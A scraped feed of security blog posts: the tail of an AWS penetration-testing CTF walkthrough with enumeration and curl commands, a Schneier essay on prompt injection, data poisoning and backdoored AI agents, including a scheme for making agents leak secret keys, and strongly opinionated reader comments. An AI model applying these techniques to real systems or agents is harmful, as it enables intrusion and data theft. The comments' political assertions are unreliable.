get-resources --rest-api-id [API ID] --profile sns-secrets --region us-east-1\nThis image shows how to enumerate the Stage Name.\nThis image shows how to enumerate the resource path.\nWith these, we can retrieve the full URL with the following syntax:\nhttps://[API-ID].execute-api.us-east-1.amazonaws.com/[stageName]/[resourcePath]\nFinally, we can use a CURL request with the API Key to retrieve the final flag!\ncurl -X GET \"[API Gateway URL]\" -H \"x-api-key: 45a3da610dc64703b10e273a4db135bf\"\nThis image shows how to retrieve the final flag.\nConclusion\nThis walkthrough demonstrates the full attack path for the “sns_secrets” scenario, showcasing key skills needed for AWS Penetration Testing. We covered setting up AWS credentials in the CLI and Pacu, performing basic IAM enumeration, and then identifying and subscribing to SNS Topics. By following these steps, you completed the challenge and gained a deeper understanding of AWS misconfigurations.\nAs always, feel free to follow us on Twitter or LinkedIn and join our Discord server for more releases and blog posts.\nTwitter: https://twitter.com/rhinosecurity\nLinkedIn: https://www.linkedin.com/company/rhino-security-labs/\nDiscord: https://discord.gg/TUuH26G5\nResearcher/Author: https://youtube.com/@TylerRamsbey", "timestamp": "2025-10-21T13:34:55.768028"}
{"source": "blog", "feed": "https://www.schneier.com/feed/", "title": "A Cybersecurity Merit Badge", "url": "https://www.schneier.com/blog/archives/2025/10/a-cybersecurity-merit-badge.html", "published": "Tue, 21 Oct 2025 11:07:34 +0000", "content": "A Cybersecurity Merit Badge\nScouting America (formerly known as Boy Scouts) has a new badge in cybersecurity. There’s an image in the article; it looks good.\nI want one.\nScouting America (formerly known as Boy Scouts) has a new badge in cybersecurity. There’s an image in the article; it looks good.\nI want one.\nFun Fact, the Cybersecurity Merit Badge background pattern is hex-encoded ASCII for “Scouting America [NEWLINE] Be Prepared”\nSubscribe to comments on this entry\nSidebar photo of Bruce Schneier by Joe MacInnis.", "timestamp": "2025-10-21T13:35:00.140503"}
{"source": "blog", "feed": "https://www.schneier.com/feed/", "title": "Agentic AI’s OODA Loop Problem", "url": "https://www.schneier.com/blog/archives/2025/10/agentic-ais-ooda-loop-problem.html", "published": "Mon, 20 Oct 2025 11:00:28 +0000", "content": "Agentic AI’s OODA Loop Problem\nThe OODA loop—for observe, orient, decide, act—is a framework to understand decision-making in adversarial situations. We apply the same framework to artificial intelligence agents, who have to make their decisions with untrustworthy observations and orientation. To solve this problem, we need new systems of input, processing, and output integrity.\nMany decades ago, U.S. Air Force Colonel John Boyd introduced the concept of the “OODA loop,” for Observe, Orient, Decide, and Act. These are the four steps of real-time continuous decision-making. Boyd developed it for fighter pilots, but it’s long been applied in artificial intelligence (AI) and robotics. An AI agent, like a pilot, executes the loop over and over, accomplishing its goals iteratively within an ever-changing environment. This is Anthropic’s definition: “Agents are models using tools in a loop.”1\nOODA Loops for Agentic AI\nTraditional OODA analysis assumes trusted inputs and outputs, in the same way that classical AI assumed trusted sensors, controlled environments, and physical boundaries. This no longer holds true. AI agents don’t just execute OODA loops; they embed untrusted actors within them. Web-enabled large language models (LLMs) can query adversary-controlled sources mid-loop. Systems that allow AI to use large corpora of content, such as retrieval-augmented generation (https://en.wikipedia.org/wiki/Retrieval-augmented_generation), can ingest poisoned documents. Tool-calling application programming interfaces can execute untrusted code. Modern AI sensors can encompass the entire Internet; their environments are inherently adversarial. That means that fixing AI hallucination is insufficient because even if the AI accurately interprets its inputs and produces corresponding output, it can be fully corrupt.\nIn 2022, Simon Willison identified a new class of attacks against AI systems: “prompt injection.”2 Prompt injection is possible because an AI mixes untrusted inputs with trusted instructions and then confuses one for the other. Willison’s insight was that this isn’t just a filtering problem; it’s architectural. There is no privilege separation, and there is no separation between the data and control paths. The very mechanism that makes modern AI powerful—treating all inputs uniformly—is what makes it vulnerable. The security challenges we face today are structural consequences of using AI for everything.\n- Insecurities can have far-reaching effects. A single poisoned piece of training data can affect millions of downstream applications. In this environment, security debt accrues like technical debt.\n- AI security has a temporal asymmetry. The temporal disconnect between training and deployment creates unauditable vulnerabilities. Attackers can poison a model’s training data and then deploy an exploit years later. Integrity violations are frozen in the model. Models aren’t aware of previous compromises since each inference starts fresh and is equally vulnerable.\n- AI increasingly maintains state—in the form of chat history and key-value caches. These states accumulate compromises. Every iteration is potentially malicious, and cache poisoning persists across interactions.\n- Agents compound the risks. Pretrained OODA loops running in one or a dozen AI agents inherit all of these upstream compromises. Model Context Protocol (MCP) and similar systems that allow AI to use tools create their own vulnerabilities that interact with each other. Each tool has its own OODA loop, which nests, interleaves, and races. Tool descriptions become injection vectors. Models can’t verify tool semantics, only syntax. “Submit SQL query” might mean “exfiltrate database” because an agent can be corrupted in prompts, training data, or tool definitions to do what the attacker wants. The abstraction layer itself can be adversarial.\nFor example, an attacker might want AI agents to leak all the secret keys that the AI knows to the attacker, who might have a collector running in bulletproof hosting in a poorly regulated jurisdiction. They could plant coded instructions in easily scraped web content, waiting for the next AI training set to include it. Once that happens, they can activate the behavior through the front door: tricking AI agents (think a lowly chatbot or an analytics engine or a coding bot or anything in between) that are increasingly taking their own actions, in an OODA loop, using untrustworthy input from a third-party user. This compromise persists in the conversation history and cached responses, spreading to multiple future interactions and even to other AI agents. All this requires us to reconsider risks to the agentic AI OODA loop, from top to bottom.\n- Observe: The risks include adversarial examples, prompt injection, and sensor spoofing. A sticker fools computer vision, a string fools an LLM. The observation layer lacks authentication and integrity.\n- Orient: The risks include training data poisoning, context manipulation, and semantic backdoors. The model’s worldview—its orientation—can be influenced by attackers months before deployment. Encoded behavior activates on trigger phrases.\n- Decide: The risks include logic corruption via fine-tuning attacks, reward hacking, and objective misalignment. The decision process itself becomes the payload. Models can be manipulated to trust malicious sources preferentially.\n- Act: The risks include output manipulation, tool confusion, and action hijacking. MCP and similar protocols multiply attack surfaces. Each tool call trusts prior stages implicitly.\nAI gives the old phrase “inside your adversary’s OODA loop” new meaning. For Boyd’s fighter pilots, it meant that you were operating faster than your adversary, able to act on current data while they were still on the previous iteration. With agentic AI, adversaries aren’t just metaphorically inside; they’re literally providing the observations and manipulating the output. We want adversaries inside our loop because that’s where the data are. AI’s OODA loops must observe untrusted sources to be useful. The competitive advantage, accessing web-scale information, is identical to the attack surface. The speed of your OODA loop is irrelevant when the adversary controls your sensors and actuators.\nWorse, speed can itself be a vulnerability. The faster the loop, the less time for verification. Millisecond decisions result in millisecond compromises.\nThe Source of the Problem\nThe fundamental problem is that AI must compress reality into model-legible forms. In this setting, adversaries can exploit the compression. They don’t have to attack the territory; they can attack the map. Models lack local contextual knowledge. They process symbols, not meaning. A human sees a suspicious URL; an AI sees valid syntax. And that semantic gap becomes a security gap.\nPrompt injection might be unsolvable in today’s LLMs. LLMs process token sequences, but no mechanism exists to mark token privileges. Every solution proposed introduces new injection vectors: Delimiter? Attackers include delimiters. Instruction hierarchy? Attackers claim priority. Separate models? Double the attack surface. Security requires boundaries, but LLMs dissolve boundaries. More generally, existing mechanisms to improve models won’t help protect against attack. Fine-tuning preserves backdoors. Reinforcement learning with human feedback adds human preferences without removing model biases. Each training phase compounds prior compromises.\nThis is Ken Thompson’s “trusting trust” attack all over again.3 Poisoned states generate poisoned outputs, which poison future states. Try to summarize the conversation history? The summary includes the injection. Clear the cache to remove the poison? Lose all context. Keep the cache for continuity? Keep the contamination. Stateful systems can’t forget attacks, and so memory becomes a liability. Adversaries can craft inputs that corrupt future outputs.\nThis is the agentic AI security trilemma. Fast, smart, secure; pick any two. Fast and smart—you can’t verify your inputs. Smart and secure—you check everything, slowly, because AI itself can’t be used for this. Secure and fast—you’re stuck with models with intentionally limited capabilities.\nThis trilemma isn’t unique to AI. Some autoimmune disorders are examples of molecular mimicry—when biological recognition systems fail to distinguish self from nonself. The mechanism designed for protection becomes the pathology as T cells attack healthy tissue or fail to attack pathogens and bad cells. AI exhibits the same kind of recognition failure. No digital immunological markers separate trusted instructions from hostile input. The model’s core capability, following instructions in natural language, is inseparable from its vulnerability. Or like oncogenes, the normal function and the malignant behavior share identical machinery.\nPrompt injection is semantic mimicry: adversarial instructions that resemble legitimate prompts, which trigger self-compromise. The immune system can’t add better recognition without rejecting legitimate cells. AI can’t filter malicious prompts without rejecting legitimate instructions. Immune systems can’t verify their own recognition mechanisms, and AI systems can’t verify their own integrity because the verification system uses the same corrupted mechanisms.\nIn security, we often assume that foreign/hostile code looks different from legitimate instructions, and we use signatures, patterns, and statistical anomaly detection to detect it. But getting inside someone’s AI OODA loop uses the system’s native language. The attack is indistinguishable from normal operation because it is normal operation. The vulnerability isn’t a defect—it’s the feature working correctly.\nWhere to Go Next?\nThe shift to an AI-saturated world has been dizzying. Seemingly overnight, we have AI in every technology product, with promises of even more—and agents as well. So where does that leave us with respect to security?\nPhysical constraints protected Boyd’s fighter pilots. Radar returns couldn’t lie about physics; fooling them, through stealth or jamming, constituted some of the most successful attacks against such systems that are still in use today. Observations were authenticated by their presence. Tampering meant physical access. But semantic observations have no physics. When every AI observation is potentially corrupted, integrity violations span the stack. Text can claim anything, and images can show impossibilities. In training, we face poisoned datasets and backdoored models. In inference, we face adversarial inputs and prompt injection. During operation, we face a contaminated context and persistent compromise. We need semantic integrity: verifying not just data but interpretation, not just content but context, not just information but understanding. We can add checksums, signatures, and audit logs. But how do you checksum a thought? How do you sign semantics? How do you audit attention?\nComputer security has evolved over the decades. We addressed availability despite failures through replication and decentralization. We addressed confidentiality despite breaches using authenticated encryption. Now we need to address integrity despite corruption.4\nTrustworthy AI agents require integrity because we can’t build reliable systems on unreliable foundations. The question isn’t whether we can add integrity to AI but whether the architecture permits integrity at all.\nAI OODA loops and integrity aren’t fundamentally opposed, but today’s AI agents observe the Internet, orient via statistics, decide probabilistically, and act without verification. We built a system that trusts everything, and now we hope for a semantic firewall to keep it safe. The adversary isn’t inside the loop by accident; it’s there by architecture. Web-scale AI means web-scale integrity failure. Every capability corrupts.\nIntegrity isn’t a feature you add; it’s an architecture you choose. So far, we have built AI systems where “fast” and “smart” preclude “secure.” We optimized for capability over verification, for accessing web-scale data over ensuring trust. AI agents will be even more powerful—and increasingly autonomous. And without integrity, they will also be dangerous.\nReferences\n1. S. Willison, Simon Willison’s Weblog, May 22, 2025. [Online]. Available: https://simonwillison.net/2025/May/22/tools-in-a-loop/\n2. S. Willison, “Prompt injection attacks against GPT-3,” Simon Willison’s Weblog, Sep. 12, 2022. [Online]. Available: https://simonwillison.net/2022/Sep/12/prompt-injection/\n3. K. Thompson, “Reflections on trusting trust,” Commun. ACM, vol. 27, no. 8, Aug. 1984. [Online]. Available: https://www.cs.cmu.edu/~rdriley/487/papers/Thompson_1984_ReflectionsonTrustingTrust.pdf\n4. B. Schneier, “The age of integrity,” IEEE Security & Privacy, vol. 23, no. 3, p. 96, May/Jun. 2025. [Online]. Available: https://www.computer.org/csdl/magazine/sp/2025/03/11038984/27COaJtjDOM\nThis essay was written with Barath Raghavan, and originally appeared in IEEE Security & Privacy.", "timestamp": "2025-10-21T13:35:00.671089"}
{"source": "blog", "feed": "https://www.schneier.com/feed/", "title": "Friday Squid Blogging: Squid Inks Philippines Fisherman", "url": "https://www.schneier.com/blog/archives/2025/10/friday-squid-blogging-squid-inks-philippines-fisherman.html", "published": "Fri, 17 Oct 2025 21:02:47 +0000", "content": "Friday Squid Blogging: Squid Inks Philippines Fisherman\nGood video.\nAs usual, you can also use this squid post to talk about the security stories in the news that I haven’t covered.\nGood video.\nAs usual, you can also use this squid post to talk about the security stories in the news that I haven’t covered.\ncls • October 17, 2025 6:07 PM\nInteresting article about learning the solution to K4, the 4th and final puzzle of the CIAs Kryptos sculpture.\n2 researchers learned the solution via human engineering, looking through archives at the Smithsonian.\nhttp s://www.nytimes.com/2025/10/16/science/kryptos-cia-solution-sanborn-auction.html\nBut, that doesn’t solve the puzzle, the cryptography is still not deciphered.\nfractured quote from the article\nElonka Dunin, a game designer who helps lead the most active online discussion about Kryptos, said in an interview that she hoped the text didn’t get out. But for true lovers of cryptographic skill, she said, the real challenge is not having the answer but knowing how to get there. “That’s the exciting part for me,”…\nClive Robinson • October 17, 2025 10:32 PM\n@ Bruce, ALL,\nFlock to partner with Amazon Ring\nARS Technica has an article about the data from peoples “Ring Cameras” being made available through Flock to which ever people want to pay for it.\nThis includes Law Enforcment with US ICE being specifically mentioned. However as we know Flock does it’s dirty business outside of just the US.\nThey have a quote from US Senator Ron Wyden to Flock,\n<\nblockquote>“I now believe that abuses of your product are not only likely but inevitable and that Flock is unable and uninterested in preventing them,””\nI think that is about as polite as you can say it, my own choice of words would be somewhat more pointed.\nThe thing is all these “ET Phone Home” send “back to base” home security systems are as I’ve noted before often the real reason for the devices. That is “surveillance is the real game” where money is to be made.\nThe reason I suspect for the partnering agreement is this sort of surveillance technology suffers from the “network effect” and companies like Flock are aiming to be as Tolkein put it,\n“One Ring to rule them all, One Ring to find them, One Ring to bring them all and in the darkness bind them.”\nThat is the more “feeds” you have the more you can fulfil your customers “wants”. This in turn brings in more customers which makes other sources of feeds more likely to partner, and so on untill you become the “default goto”, then the “Only Game in Town”. Much as happened with Social Media.\nResearcherZero • October 17, 2025 10:46 PM\nAs the US becomes more exposed to cyber attack, thousands have been laid off from its agencies. Equipment modernization has stalled and resources re-prioritized elsewhere.\nCommitment to US lead initiatives and long-term programs and partnerships are missing in action. Without well resourced federal coordination, individual states are on their own.\n‘https://www.cbsnews.com/news/how-china-targets-us-systems-tim-haugh-60-minutes/\nA skeleton crew has been left at CISA to run America’s cyber defenses. About one third of the staff remain behind to do the job without support or being paid for their efforts.\nhttps://www.theregister.com/2025/10/01/us_government_shutdown_it_seccurity/\nThe implications of current US policy will impact America’s defenses and national security.\nhttps://www.theatlantic.com/international/archive/2025/09/trump-foreign-policy/684294/\nThe domestic implications of US foreign policy in 2025 will be felt by the public.\nhttps://www.stimson.org/2025/testing-assumptions-about-us-foreign-policy-in-2025/\nResearcherZero • October 18, 2025 12:53 AM\nPR teams and strategists are already working hard on securing the controversy of elections.\nDominion has been purchased, renamed and will focus on the existing paper audit trail voting system. Backed by independent auditing and Christian values, the name change to “Liberty Vote” will bring with it a lexicon which sounds a lot more like “freedom”.\n‘https://edition.cnn.com/2025/10/09/politics/dominion-voting-systems-bought-election-ballots\nlurker • October 18, 2025 1:59 AM\nLive streamed podcasts are broacasting, maybe, or not …\nClive Robinson • October 18, 2025 7:54 AM\nAre GPTs the way to AGI, probably not\nIn an opinion piece for the NY Times Gary Marcus indicates why he has reservations on the future of LLM GPT AI systems.\nSilicon Valley Is Investing in the Wrong A.I.\n“Buoyed by the initial progress of chatbots, many thought that A.G.I. was imminent.\nBut these systems have always been prone to hallucinations and errors. Those obstacles may be one reason generative A.I. hasn’t led to the skyrocketing profits and productivity that many in the tech industry predicted. A recent study run by M.I.T.’s NANDA initiative found that 95 percent of companies that did A.I. pilot studies found little or no return on their investment. A recent financial analysis projects an estimated shortfall of $800 billion in revenue for A.I. companies by the end of 2030.\nIf the strengths of A.I. are truly to be harnessed, the tech industry should stop focusing so heavily on these one-size-fits-all tools and instead concentrate on narrow, specialized A.I. tools engineered for particular problems. Because, frankly, they’re often more effective.”\nPoints I’ve also been making here several times over the past few months, along with others about the perilous state of the current US economy and how the “Current AI Hype Bubble” could be a disaster for it.\nBut the question of what is “Artificial General Intelligence”(AGI) is something that has at best had an elusive answer akin to “Shoulder shrug handwaving” and impossible “What ever you want it to be” type statements. It’s something that a group of 33 specialists from 28 institutions have got together to try and address more reasonably,\nThey come up with,\nDefinition : AGI is an AI that can match or exceed the cognitive versatility and proficiency of a well-educated adult.”\nWhich although it sounds profound is actually not that useful.\nBecause the use of,\n“match … Well-educated adult.”\nIs not actually a useful measure.\nIt’s been pointed out that the “use of aids” “dumbs us down” in that it causes us to “loose skills”. I first heard this when I was in school. With first electronic calculators and whilst still in school computers.\nWhilst many would argue that it’s not important or even irrelevant, it is true that certain skills are not developed because of the use of aids.\nWhat most do not realise is that those traditional skills that are seen as nolonger worth teaching due to the ubiquitous use of aids, are actually important. Not for what they directly teach, but indirectly teach. That is they give new viewpoints that are force-multiplier tools that enable us to reason in either new ways or to levels we otherwise might not.\nAt the end of the day the two things that have moved humans forwards over many thousands of years are,\n1, Stored Knowledge.\n2, Use knowledge to reason.\nThey were and still should be the foundations of becoming “Well-educated”.\nSadly as gets often observed these days, producing “Well-educated adults” appears to be nolonger a goal of the education system in a number of Western Nations.\nArguably whilst we push a few forward we leave many more behind, thus the average by which we would judge “Well-educated adult” steadily declines.\nThis gets worse because we also use the failing “free-education” to push those who do want to advance into “debt” especially where education has been taken over by political or corporate interests. A dispassionate examination of many higher-education institutions comes to two basic conclusions,\n1, They have become money machines\n2, They are failing those who pay in\nWith a third, very concerning for society in general, conclusion of\n3, Undue and to often radical political indoctrination.\nThis is most definitely not the way to reverse the downward trend.\nThus arguably AGI will happen with no further progress in any area of AI, simply because the measure of “Well-educated adult” drops bellow the nonsense we currently have with “Current LLM and ML Systems”.\nThe paper has similar things in it which highlight this point.\nUnder “Commonsense” it asks the question,\n“Does making a sandwich take longer than baking bread?”\nArguably as making part of a sandwich is baking bread the answer is “YES” not as some might say “NO”…\nAlso the making of butter, mayonnaise, cheese and cooked or smoked meat/fish/veggies. Even making peanut butter and jam, or just aquiring them from a store. Thus it assumes that the person being asked leads a very “western”, “convenience”, “with servant/assistant” lifestyle. Which really is only true for a very small percentage of even “Well-educated adults”[1].\nIn fact as is often the case with a “written work” it betrays more about the authors biases than it actually does about the subject it is written to address.\nIn this case it’s obvious that there are significant,\n1, First world academic bias.\n2, US upper middle class bias.\n3, US education and lifestyle bias.\n4, Implicit emotional bias.\n5, Implicit cognitive bias.\nMany of the questions suggested “for asking” to make the measures are so inappropriate as to not in any way demonstrate “intelligence” general or otherwise.\nBut the other issue that arises is the implicit notion that “all fruits are equal” without question, from those biases.\nConsider the more obvious differences,\n1, Humans are known to have “imperfect memory” and that there is good evolutionary reasons for this. 2, Computer memory in most cases is designed to have “perfect retention” for the data stored.\nThe two are poles apart when you get below the 20,000ft / superficial view. And why we generally do not compare “apples with oranges”.\nThe simple truth is AI will never be equivalent of Human Intelligence as they are not ever going to be the same at so many levels not just the measures but any conclusions will be fairly if not totally pointless.\nBut ask yourself a question of,\n“Does this matter?”\nThe answer depends on your viewpoint and chosen occupations and interests.\nWhat ever they are I can say reading the paper with it’s flaws should help people understand the problem domain better and thus use that to inform their future viewpoint.\n[1] Admittedly when quite young I was actually helping my mother make bread, cooked meats and jam long before she would let me make a sandwich (I was actually cooking breakfast for me and the family before sandwich making)[2]. Further as a “certain type of engineer” as an adult I take a “production / value added chain” view of the world and actually know all the steps from water evaporating from the sea to the flour, salad vegetables, eggs, cheese and various meats (and yes how to make mayonnaise, salad cream, jam and even peanut butter).\n[2] My mother had a certain viewpoint about “sharp tools” that “accidents WILL happen” if you let them. And it was confirmed one day when I was still very young when I sliced the corner of my index finger off, when cutting a piece of wood down to make a toy. Hence confirming the old,\n“Children and fools should not use sharp tools.”\nMum was understandably upset, Dad on the other hand took the “live and learn” viewpoint of “that’s a lesson he won’t soon forget”. And much to Mum’s annoyance let me use a small saw from his tools to finish the job thus additionally seeding the idea of “right tool for the job” in my head.\nTheir views were different and apparently contradictory, but both were actually right. A point many people won’t consider in their reasoning processes.\nClive Robinson • October 18, 2025 2:45 PM\n@ ResearcherZero, ALL,\nWith regards,\n“Commitment to US lead initiatives and long-term programs and partnerships are missing in action. Without well resourced federal coordination, individual states are on their own.”\nA couple of things spring to mind,\nFirst is the “Defence Spending Paradox” of,\n“You never know when you have spent to much… But spend to little gets you attacked when you can least defend yourself”.\nSecondly is the “No man is an island” thesis of,\n“You can not reasonably expect to defend or fight on all fronts or with more than a single enemy.”\nThus it pays to “have friends” or allies in the same boat especially if they are geographically adjacent. Because it shortens the length of boarder you have to defend whilst making the front an attacker is faced with considerably larger.\nI know Gen Isma said NATO was to keep peace in Europe by keeping Germany Down, Russia Out and the US in.\nBut times change Germany is very much in, Russia is likely to move in, and the US is effectively out.\nThe only reason the current US Executive sees any purpose for NATO currently is two reasons,\n1, US Arms manufacturers want the sales and lobby US politicians hard.\n2, The US economy is effectively not growing but shrinking, a very much increased level of arms sales to Europe would give much needed income, jobs, credibility to the US Gov. If only to subsidize it’s arms development.\nThe thing about Arms Sales is they always come with a hidden price two of the most obvious aspects are,\n1, You are tied in for 30-50years.\n2, You are subject to the selling countries political control.\nWe’ve seen both of these in recent times and it’s one of the reasons EU purchase of US Arms is not at the levels the US Executive wants.\nThe EU saw that after the fall of both the Berlin Wall and the Soviet Union that the need for “arms spending” was not as important thus in effect decided much of it was a “lost opportunity cost” thus shifted the focus of their spending.\nThe main manufactures of arms in Europe where Britain, France, Germany, Italy. With only Britain and France being “nuclear capable” and France being the only “fully independent” one[1]. Things however have changed and Britain is mostly seen as the “outsider” now along with the US. France is strongly pushing to have all EU defence money come into the French economy. Germany is still suffering from political issues at home and nobody really knows what is going on in Italy including the Italians. Smaller EU nations up along the Russian boarders are “working around the mess”, whilst some are “not paying/playing” like Portugal.\nThe thing is does the EU have enough reserves to cover the time to “ramp-up production”. Well every one wrote of the Ukraine but they managed to ramp up in only a little over a year. Unfortunately that war due to US policy / interference has turned it into a war of attrition that due to simple size differences the Ukranians are unlikely to win. Something that Moscow and Putin clearly know and are quite happy to throw hundreds of thousands of their people anually into that “meat grinder”. It’s why the tactic by them is “talk, demand, delay” but not negotiate at all.\nObviously the US Arms manufacturers do not want it to stop either, thus neither do US politicians on “The brown envelope reception committee”.\nSo the result is take money from the Russian’s by sanction, the Ukranians by need, and the rest of Europe by having the “Mad panty poisoner” rubbing his hands so that he can invade and use the Ukrainian resources for blackmail. On a slightly different version of the old “It’s Winter let’s turn the gas tap off” or “People are staving lets blockade and destroy the grain” till we get our way. Both of which have probably killed more people than by the bombs and bullets of war.\nThe real lesson is not “supply line security” but “production security” where you “Design and make with your own resources that are fully under your control” either naturally or by stockpile and cut out the “blackmailing flakes and war profiteers” that will bleed you dry.\nAnd further realise that with the Russian attitude / tactics, “strategic weapons” that were thought of as “unusable by sane people” should now actually be considered “tactical” and “first response” against their “political / population” centers. Because oddly to many, it’s the “rational actor” response, to the demonstrated Russian “meat grinder” tactics.\nIn a way,\n“It’s less expensive to kill them in their beds at home, than in your backyard.”\nThe notion of “Mutually Assured Destruction”(MAD) has always been questionable even when it was just a “two player game”. Now it’s a multi-player game MAD is at best a fantasy. China and Russia both know this, as does the US and any sensible multi-player games strategist. If you take time to look you will see the “telltales” of this in actual behaviours. Further small nations know that even low yield IRBMs are effective “Keep of the Grass” notices because they get in the “citizens minds” and they in turn “get in the politicians faces” and “line opposition pockets”. Have a look at Pakistan – India, India – China, North Korea – USA, and more recently US+Israel – Iran. You will see all you need to see to get a realisation\nIf you look at Iran and North Korea, the way to get them into producing nuclear weapons and more importantly effective delivery systems is for the usual nonsense from the US Executive and State Department. Each time, the US does something stipid like back out of an agreement, they both “ramp it up a notch” and don’t back it down.\nWhilst Iran does not currently have a tested nuclear device that we know of (NK does). Estimates from independent intelligence observers say two main things,\n1, Iran’s facilities are way to spread out to attack with any real chance of success.\n2, It would take 6-18months for them to not just make but test a nuclear device.\nBut consider the delivery system does not have to hit a barn door or less, a “Circular error probable”CEP) as big as a Midwestern large Farm or bigger will be fine for even small nukes and large population centers.\nWe know they already have effective delivery devices with much smaller CEPs that can easily reach Israel, and most US bases in the Mediterranean and Middle East.\nThe thing about missile based delivery systems tactical or otherwise is their cost drops at a rate near equivalent to the drop in the cost of technology. Likewise the cost of “Physics Packages” for warheads not just drop in cost but significantly faster in getting reduced in size and mass, thus making delivery systems very much easier.\nSo they don’t have to hit the continental US to do considerable harm to the US via it’s interests in the region.\nIt’s not a game the US can win especially if Iran thinks they can get a draw or have an acceptable loss. Which they obviously have considered and in some respects already tested against a well defended opponent with a degree of success.\nOne dispute or another “at the border etc” is going to cause a preemptive strike, it’s not a question of “if” but “when”, many scientists and other academics have “done the math” and know this to be the case.\nThe problem is many authoritarian types in politics hate science and make up nonsense that is politically convenient for them irrespective of reality.\nRealistically Europe needs the US and it’s influence out of Europe, likewise it needs to dump all weapons that come out of the US where the political gas tap can be turned off at any time for any reason. Thus the Europeans need to build up their own strategic and tactical weapons systems and due to advances in technology make them unmanned and semi or fully autonomous because the one thing AI systems are really good at is pattern matching which means defensive systems will be way more effective and low cost.\nJust one example of this is that the Ukrainians have developed a sound based defence system that can not just detect but accurately target Russian drones by pattern matching and vectoring. Each base is small and can be easily carried. The Russians made modifications to their drones to change the sound. The Ukrainians took only a day or so to retune the system. It’s actually based on the same sort of ideas that the US City-Wide Gun Fired detectors work. Which means it could also be used for locating “Shoot and scoot” artillery “fires systems” and bring in a salvo on them before they can effectively “scoot”, hence “unmanned” fully autonomous effectively “one time” systems are getting increasingly desirable.\n[1] Contrary to what many people think the US does have a veto on Britains nuclear deterrent. Though to what extent is not made public, it just gets swept under the parasitic “Special Relationship” rug. That is in reality only about 5-Eyes, leasing land to the US for bases and similar, and one sided treaties. With the UK politicians in all other ways KowTowing, fawning, and pandering to US political whims and as seen recently getting shunned and humiliated. This has got considerably worse since Brexit put the UK into isolation thus effectively having no reliable friends at it’s back (even in NATO).\nStephenM • October 19, 2025 9:21 AM\n@ Clive Robinson\n\"Contrary to what many people think the US does have a veto on Britain's nuclear deterrent.\"\nThis is another thing wrong with AUKUS. There may be a slight chance that the submarine will be delivered after being paid for but NO CHANCE that it will be free of strings. IF a submarine is delivered the danger is not just that Aus will not have the capacity to operate it independently, and be told when NOT to use it; but that it will be told WHEN to use it.\nAus will then be in a difficult position because the money spent on other defense capability will have been indirectly proportional to that spent on AUKUS. Aus defenses will be so depleted that it is hard not to get the feeling that proponents of AUKUS see it as a method of paying protection money.\nThe only problem is the “America first” policy. And when conflict happens and all goes wrong, as it most surely will, that policy will kick in.\nClive Robinson • October 19, 2025 11:32 AM\n@ StephenM, ALL,\nWith regards,\n“This is another thing wrong with AUKUS. There may be a slight chance that the submarine will be delivered after being paid for but NO CHANCE that it will be free of strings. IF a submarine is delivered the danger is not just that Aus will not have the capacity to operate it independently, and be told when NOT to use it; but that it will be told WHEN to use it.”\nIt is the last part of “WHEN to” that actually really concerns me.\nIf you look at NATO, there is the\n“All for one and one for all.”\nClauses.\nThe only time that one of them has been used is by the US after 9/11. It was actually a totally invalid use, because the clauses were about nation state or recognised government attackers, not a bunch of ad hoc criminals trying to pretend they had political aspirations.\nThe US used the NATO Defence treaty to strong arm uninvolved European Nations into a conflict the US via the State Dept had created for “economic benefit” and cushy lifestyles for the more privileged US Middle and Upper Classes[1].\nThe French decided they were not going to get dragged in. Hence the “Cheese eating surrender monkeys” and imbecilic “Freedom fries”, and “Freedom units” and similar that only those with less sense under the “Red Hat” than hair lice would give would articulate.\nUnfortunately what caused the whole nasty process to happen was an extremely narcissistic and venal crook who just happened to be the UK Prime Minister at the time. He wanted a war for glory so he could be in his eyes a better premier than Margaret Thatcher… Unfortunately Tony Blair is still around creating trouble, he somehow talked his way into the recent Gaza / Israel ceasefire as a “peace envoy”, thus it’s almost guaranteed to fail based on Tony’s entire previous dealings involving the Middle East[2].\nStalin had an expression for people like Tony and his cronies and that was “Useful Idiot”. Implying they are too stupid to realise they are just being manipulated by their own failings to be a stooge come puppet, come fall guy.\nUnfortunately where ever you go in the world where there is political power you will always find people being “Useful Idiots” to others machinations and Machiavellian intent. As we know Australian politics is full of such “Special Relationship” idiots. The previous premier or two being no exception to this form of idiocy.\nSo yes I can see such an idiot “Going to war with China” just to wear a blue hat with a Southern Cross on it next to a vacuous red hat mouth breather.\nPeople might have noticed from the quite recent news the UK Prime Minister Sir Keir Starmer has just been “dissed and humiliated” by the mouth breather in Sharm El Sheikh quite deliberately much to the amusement of those who apparently knew it was comming. The mouth breather then went on to rub Tony Blair’s nose in it with a quip about the Northern Ireland peace deal. For those that don’t know, although Tony has repeatedly tried to take credit for it, he had next to nothing to do with it.\n[1] Corporate behaviour lobbying legislators via campaign money etc were getting the use of US Federal Guard Labour agencies to apply “depressing pressure” or “Highway Robbery” on nations that could not defend themselves against the “Bomb them back to the stone ages” US political attitude of “What’s ours is ours, and what’s yours is now ours”. It’s why back then about 1/50th of the worlds population was consuming around 50% of the worlds resources and why the US Standard of living after certain corrections was said to be ten times the world average (in real terms it was actually significantly higher). Basically “Might is Right” as part of the “Pope Game”, something that can clearly be seen in recent and current news is very much still going on.\n[2] Speaking of Bush’s Poodle Tony, with all the signs the Israeli Government have no intention of honouring the Trump Peace Deal before the ink is dry… I wonder if Tony is going to somehow claim credit for what is in effect rapidly shaping up as a complete failure,\nClive Robinson • October 19, 2025 1:48 PM\nOpen AI targets own feet again\nWe are kind of getting used to Sam Altman making llets just call them “hallucination level claims” rather more than 1/3rd of the time. And his response on being called is “ignore or dodge”.\nThis time however the Open AI researchers were not only deliberately using “Weasley Words” but “deleted and backpedaled”…\nThis was over supposed AGI performance from GPT5.\nWhat had happened though was rather more interesting.\nGPT5 had found existing research that was not easily found.\nA well known problem in Academia is publishing a paper where yhe author is unaware of existing research. So may re-invent the wheel or end up with incorrect findings.\nThus as an “agent” GPT5 may have use as a “research assistant” to those actively doing research rather than effectively wasting time reading hundreds of probably not related papers.\nI happen to read papers for “fun and knowledge” and thus have a very broad if eclectic tastes for papers.\nBut most researchers in academia are usually narrowly focused and don’t have time for distractions, if they are also to “have a life”.\nSo a narrowly focused Agent that can reliably “pre-filter” or just “rank” papers would be quite desirable.\nOpen AI’s GPT5 might not make good on Sam Altman’s hype or money grabbing aspirations by hallucinations, but it might actually have a real use in aiding research etc.\nClive Robinson • October 19, 2025 3:27 PM\nCal law will improve security and privacy of individuals.\nOne of the ways ISPs gain concealed income is by theft of privacy and security from users. This is fairly well known but not many think about how the ISPs can gain the advantage.\nOne such way is “Bulk billing contracts” with Landlords of “Multiple Tenant Environment”(MTE) properties. In which the landlord,\n1, Gets a kickback from the Service 